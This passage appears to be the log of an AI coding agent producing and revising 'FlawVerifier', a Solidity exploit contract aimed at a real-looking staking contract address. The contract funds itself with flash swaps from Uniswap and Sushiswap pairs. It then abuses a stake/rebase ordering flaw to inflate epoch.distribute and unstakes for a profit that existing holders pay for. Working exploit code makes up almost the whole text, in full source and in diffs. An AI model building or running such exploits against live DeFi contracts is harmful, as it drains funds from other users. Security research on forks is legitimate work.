++        // before the matching `A` sHATE is sent out. That ordering poisons the newly computed
++        // `epoch.distribute` because the principal is counted in HATE backing while the matching
++        // sHATE is still excluded from `circulatingSupply()`.
+         _approveMax(hate, TARGET, amount);
+         staking.stake(address(this), amount);
+ 
++        // Path stage 3:
++        // Let the next rebase execute after the poisoned `epoch.distribute` has been stored, then
++        // redeem the attacker position while existing holders absorb the shortfall. On a fixed fork
++        // we cannot advance time, so this verifier only executes when the system is already at least
++        // one full additional epoch behind and a second rebase is immediately callable.
++        _assertSecondExpiredEpoch(staking);
+         staking.rebase();
+ 
+-        address sHate = staking.sHATE();
+         uint256 sBalance = IERC20Like(sHate).balanceOf(address(this));
+         require(sBalance != 0, "exploit:no_sHATE");
+ 
+@@ -234,9 +242,20 @@
+ 
+     function _checkPathPreconditions(IHATEStaking staking) internal view {
+         (uint256 length,, uint256 end,) = staking.epoch();
++        require(length != 0, "path:zero_epoch_length");
++        require(end <= block.timestamp, "path:not_expired");
++        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++    }
++
++    function _assertExpiredEpoch(IHATEStaking staking) internal view {
++        (, , uint256 end,) = staking.epoch();
+         require(end <= block.timestamp, "path:not_expired");
++    }
++
++    function _assertSecondExpiredEpoch(IHATEStaking staking) internal view {
++        (uint256 length,, uint256 end,) = staking.epoch();
+         require(length != 0, "path:zero_epoch_length");
+-        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++        require(end <= block.timestamp, "path:no_second_expired_epoch");
+     }
+ 
+     function _flashFee(uint256 amount) internal pure returns (uint256) {
+
+ succeeded in 536ms:
+codex
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IsHATELike is IERC20Like {
+    function circulatingSupply() external view returns (uint256);
+}
+
+interface IHATEStaking {
+    function HATE() external view returns (address);
+    function sHATE() external view returns (address);
+    function epoch() external view returns (uint256 length, uint256 number, uint256 end, uint256 distribute);
+    function stake(address to, uint256 amount) external;
+    function unstake(address to, uint256 amount, bool rebase_) external;
+    function rebase() external;
+}
+
+interface IUniswapV2FactoryLike {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract FlawVerifier {
+    address public constant TARGET = 0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8;
+
+    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
+
+    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address private constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
+
+    uint256 private _profitAmount;
+    bool private _executed;
+
+    constructor() {}
+
+    function profitToken() external view returns (address) {
+        return IHATEStaking(TARGET).HATE();
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function executeOnOpportunity() external {
+        require(!_executed, "already executed");
+        _executed = true;
+
+        IHATEStaking staking = IHATEStaking(TARGET);
+        address hate = staking.HATE();
+
+        _checkPathPreconditions(staking);
+
+        uint256 verifierBalance = IERC20Like(hate).balanceOf(address(this));
+        if (verifierBalance != 0) {
+            uint256 startingBalance = verifierBalance;
+            uint256 amount = _boundAttackAmount(staking, verifierBalance);
+            require(amount != 0, "direct:no_usable_hate");
+
+            _executeExploit(staking, hate, amount);
+
+            uint256 endingBalance = IERC20Like(hate).balanceOf(address(this));
+            require(endingBalance > startingBalance, "direct:no_profit");
+            _profitAmount = endingBalance - startingBalance;
+            return;
+        }
+
+        require(_attemptFlashFunding(staking, hate), "funding:no_supported_hate_liquidity");
+        require(_profitAmount != 0, "flashswap:no_profit");
+    }
+
+    function initiateFlashSwap(address pair, uint256 amountOut) external {
+        require(msg.sender == address(this), "self_only");
+
+        address hate = IHATEStaking(TARGET).HATE();
+        address token0 = IUniswapV2PairLike(pair).token0();
+        address token1 = IUniswapV2PairLike(pair).token1();
+        require(token0 == hate || token1 == hate, "pair:no_hate");
+
+        uint256 amount0Out = token0 == hate ? amountOut : 0;
+        uint256 amount1Out = token1 == hate ? amountOut : 0;
+        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), abi.encode(pair, amountOut));
+    }
+
+    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        (address pair, uint256 borrowedAmount) = abi.decode(data, (address, uint256));
+        require(msg.sender == pair, "callback:invalid_pair");
+
+        address hate = IHATEStaking(TARGET).HATE();
+        address token0 = IUniswapV2PairLike(pair).token0();
+        address token1 = IUniswapV2PairLike(pair).token1();
+        require(token0 == hate || token1 == hate, "callback:no_hate");
+
+        uint256 received = token0 == hate ? amount0 : amount1;
+        require(received == borrowedAmount, "callback:amount_mismatch");
+
+        IHATEStaking staking = IHATEStaking(TARGET);
+        _executeExploit(staking, hate, borrowedAmount);
+
+        uint256 repayment = borrowedAmount + _flashFee(borrowedAmount);
+        _safeTransfer(hate, pair, repayment);
+
+        uint256 remaining = IERC20Like(hate).balanceOf(address(this));
+        require(remaining != 0, "callback:no_profit");
+        _profitAmount = remaining;
+    }
+
+    receive() external payable {}
+
+    function _attemptFlashFunding(IHATEStaking staking, address hate) internal returns (bool) {
+        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
+        address[5] memory counterparties = [WETH, USDC, USDT, DAI, FRAX];
+        uint256[4] memory bpsOptions = [uint256(9_000), uint256(7_500), uint256(5_000), uint256(2_500)];
+
+        for (uint256 i = 0; i < factories.length; ++i) {
+            for (uint256 j = 0; j < counterparties.length; ++j) {
+                if (counterparties[j] == hate) {
+                    continue;
+                }
+
+                address pair = IUniswapV2FactoryLike(factories[i]).getPair(hate, counterparties[j]);
+                if (pair == address(0)) {
+                    continue;
+                }
+
+                uint256 reserve = _hateReserve(pair, hate);
+                if (reserve == 0) {
+                    continue;
+                }
+
+                uint256 maxUseful = _boundAttackAmount(staking, reserve);
+                if (maxUseful == 0) {
+                    continue;
+                }
+
+                for (uint256 k = 0; k < bpsOptions.length; ++k) {
+                    uint256 candidate = (maxUseful * bpsOptions[k]) / 10_000;
+                    if (candidate == 0) {
+                        continue;
+                    }
+
+                    uint256 minRepayment = candidate + _flashFee(candidate);
+                    uint256 circulating = IsHATELike(staking.sHATE()).circulatingSupply();
+                    uint256 minimumStageThreeGain =
+                        circulating == 0 ? candidate : (candidate * candidate) / (circulating + candidate);
+                    if (minimumStageThreeGain <= (minRepayment - candidate)) {
+                        continue;
+                    }
+
+                    try this.initiateFlashSwap(pair, candidate) {
+                        return _profitAmount != 0;
+                    } catch {
+                        if (_profitAmount != 0) {
+                            return true;
+                        }
+                    }
+                }
+            }
+        }
+
+        return false;
+    }
+
+    function _executeExploit(IHATEStaking staking, address hate, uint256 amount) internal {
+        require(amount != 0, "exploit:zero_amount");
+
+        _checkPathPreconditions(staking);
+
+        address sHate = staking.sHATE();
+
+        // Path stage 1:
+        // Wait until `epoch.end <= block.timestamp` so `stake()` will execute `rebase()`.
+        _assertExpiredEpoch(staking);
+
+        // Path stage 2:
+        // Call `stake(attacker, A)`, causing `A` HATE to be transferred into the staking contract
+        // before the matching `A` sHATE is sent out. That ordering poisons the newly computed
+        // `epoch.distribute` because the principal is counted in HATE backing while the matching
+        // sHATE is still excluded from `circulatingSupply()`.
+        _approveMax(hate, TARGET, amount);
+        staking.stake(address(this), amount);
+
+        // Path stage 3:
+        // Let the next rebase execute after the poisoned `epoch.distribute` has been stored, then
+        // redeem the attacker position while existing holders absorb the shortfall. On a fixed fork
+        // we cannot advance time, so this verifier only executes when the system is already at least
+        // one full additional epoch behind and a second rebase is immediately callable.
+        _assertSecondExpiredEpoch(staking);
+        staking.rebase();
+
+        uint256 sBalance = IERC20Like(sHate).balanceOf(address(this));
+        require(sBalance != 0, "exploit:no_sHATE");
+
+        _approveMax(sHate, TARGET, sBalance);
+        staking.unstake(address(this), sBalance, false);
+    }
+
+    function _boundAttackAmount(IHATEStaking staking, uint256 fundingCeiling) internal view returns (uint256) {
+        address hate = staking.HATE();
+        address sHate = staking.sHATE();
+
+        uint256 stakingBalance = IERC20Like(hate).balanceOf(TARGET);
+        uint256 circulating = IsHATELike(sHate).circulatingSupply();
+
+        uint256 cap = fundingCeiling;
+        if (stakingBalance < cap) {
+            cap = stakingBalance;
+        }
+        if (circulating != 0 && circulating < cap) {
+            cap = circulating;
+        }
+
+        return cap;
+    }
+
+    function _hateReserve(address pair, address hate) internal view returns (uint256) {
+        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
+        if (IUniswapV2PairLike(pair).token0() == hate) {
+            return uint256(reserve0);
+        }
+        if (IUniswapV2PairLike(pair).token1() == hate) {
+            return uint256(reserve1);
+        }
+        return 0;
+    }
+
+    function _checkPathPreconditions(IHATEStaking staking) internal view {
+        (uint256 length,, uint256 end,) = staking.epoch();
+        require(length != 0, "path:zero_epoch_length");
+        require(end <= block.timestamp, "path:not_expired");
+        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
+    }
+
+    function _assertExpiredEpoch(IHATEStaking staking) internal view {
+        (, , uint256 end,) = staking.epoch();
+        require(end <= block.timestamp, "path:not_expired");
+    }
+
+    function _assertSecondExpiredEpoch(IHATEStaking staking) internal view {
+        (uint256 length,, uint256 end,) = staking.epoch();
+        require(length != 0, "path:zero_epoch_length");
+        require(end <= block.timestamp, "path:no_second_expired_epoch");
+    }
+
+    function _flashFee(uint256 amount) internal pure returns (uint256) {
+        return ((amount * 3) / 997) + 1;
+    }
+
+    function _approveMax(address token, address spender, uint256 minimum) internal {
+        if (IERC20Like(token).allowance(address(this), spender) >= minimum) {
+            return;
+        }
+
+        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
+        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max));
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
+    }
+
+    function _callOptionalReturn(address token, bytes memory data) internal {
+        (bool ok, bytes memory returndata) = token.call(data);
+        require(ok, "erc20:call_failed");
+        if (returndata.length != 0) {
+            require(abi.decode(returndata, (bool)), "erc20:operation_failed");
+        }
+    }
+}
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index 31a126c96d0fe47d85eab6037fac00a7277572bd..edee7a3f0e166a9bd606d839b3de581acd8a6a79
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: MIT
+-pragma solidity 0.8.19;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20Like {
+     function balanceOf(address account) external view returns (uint256);
+@@ -73,7 +73,7 @@
+             uint256 amount = _boundAttackAmount(staking, verifierBalance);
+             require(amount != 0, "direct:no_usable_hate");
+ 
+-            _runExploitWithAmount(staking, hate, amount);
++            _executeExploit(staking, hate, amount);
+ 
+             uint256 endingBalance = IERC20Like(hate).balanceOf(address(this));
+             require(endingBalance > startingBalance, "direct:no_profit");
+@@ -86,7 +86,7 @@
+     }
+ 
+     function initiateFlashSwap(address pair, uint256 amountOut) external {
+-        require(msg.sender == address(this), "self only");
++        require(msg.sender == address(this), "self_only");
+ 
+         address hate = IHATEStaking(TARGET).HATE();
+         address token0 = IUniswapV2PairLike(pair).token0();
+@@ -111,7 +111,7 @@
+         require(received == borrowedAmount, "callback:amount_mismatch");
+ 
+         IHATEStaking staking = IHATEStaking(TARGET);
+-        _runExploitWithAmount(staking, hate, borrowedAmount);
++        _executeExploit(staking, hate, borrowedAmount);
+ 
+         uint256 repayment = borrowedAmount + _flashFee(borrowedAmount);
+         _safeTransfer(hate, pair, repayment);
+@@ -156,9 +156,10 @@
+                     }
+ 
+                     uint256 minRepayment = candidate + _flashFee(candidate);
+-                    uint256 staked = IsHATELike(staking.sHATE()).circulatingSupply();
+-                    uint256 minBonusFloor = staked == 0 ? candidate : (candidate * candidate) / (staked + candidate);
+-                    if (minBonusFloor <= (minRepayment - candidate)) {
++                    uint256 circulating = IsHATELike(staking.sHATE()).circulatingSupply();
++                    uint256 minimumStageThreeGain =
++                        circulating == 0 ? candidate : (candidate * candidate) / (circulating + candidate);
++                    if (minimumStageThreeGain <= (minRepayment - candidate)) {
+                         continue;
+                     }
+ 
+@@ -176,26 +177,33 @@
+         return false;
+     }
+ 
+-    function _runExploitWithAmount(IHATEStaking staking, address hate, uint256 amount) internal {
++    function _executeExploit(IHATEStaking staking, address hate, uint256 amount) internal {
+         require(amount != 0, "exploit:zero_amount");
+ 
+-        // Path stage 1: the fork must already be on or after an expired epoch so that
+-        // `stake()` executes its internal `rebase()` without any off-chain time control.
+-        (uint256 length,, uint256 end,) = staking.epoch();
+-        require(end <= block.timestamp, "path:not_expired");
++        _checkPathPreconditions(staking);
+ 
+-        // Path stage 3 needs the next rebase to execute as part of the same exploit entry.
+-        // That is only possible on a fixed fork if the system is already at least one full
+-        // additional epoch behind after the first `stake()`-triggered rebase.
+-        require(length != 0, "path:zero_epoch_length");
+-        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++        address sHate = staking.sHATE();
+ 
++        // Path stage 1:
++        // Wait until `epoch.end <= block.timestamp` so `stake()` will execute `rebase()`.
++        _assertExpiredEpoch(staking);
++
++        // Path stage 2:
++        // Call `stake(attacker, A)`, causing `A` HATE to be transferred into the staking contract
++        // before the matching `A` sHATE is sent out. That ordering poisons the newly computed
++        // `epoch.distribute` because the principal is counted in HATE backing while the matching
++        // sHATE is still excluded from `circulatingSupply()`.
+         _approveMax(hate, TARGET, amount);
+         staking.stake(address(this), amount);
+ 
++        // Path stage 3:
++        // Let the next rebase execute after the poisoned `epoch.distribute` has been stored, then
++        // redeem the attacker position while existing holders absorb the shortfall. On a fixed fork
++        // we cannot advance time, so this verifier only executes when the system is already at least
++        // one full additional epoch behind and a second rebase is immediately callable.
++        _assertSecondExpiredEpoch(staking);
+         staking.rebase();
+ 
+-        address sHate = staking.sHATE();
+         uint256 sBalance = IERC20Like(sHate).balanceOf(address(this));
+         require(sBalance != 0, "exploit:no_sHATE");
+ 
+@@ -234,9 +242,20 @@
+ 
+     function _checkPathPreconditions(IHATEStaking staking) internal view {
+         (uint256 length,, uint256 end,) = staking.epoch();
++        require(length != 0, "path:zero_epoch_length");
++        require(end <= block.timestamp, "path:not_expired");
++        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++    }
++
++    function _assertExpiredEpoch(IHATEStaking staking) internal view {
++        (, , uint256 end,) = staking.epoch();
+         require(end <= block.timestamp, "path:not_expired");
++    }
++
++    function _assertSecondExpiredEpoch(IHATEStaking staking) internal view {
++        (uint256 length,, uint256 end,) = staking.epoch();
+         require(length != 0, "path:zero_epoch_length");
+-        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++        require(end <= block.timestamp, "path:no_second_expired_epoch");
+     }
+ 
+     function _flashFee(uint256 amount) internal pure returns (uint256) {
+
+tokens used
+37,841
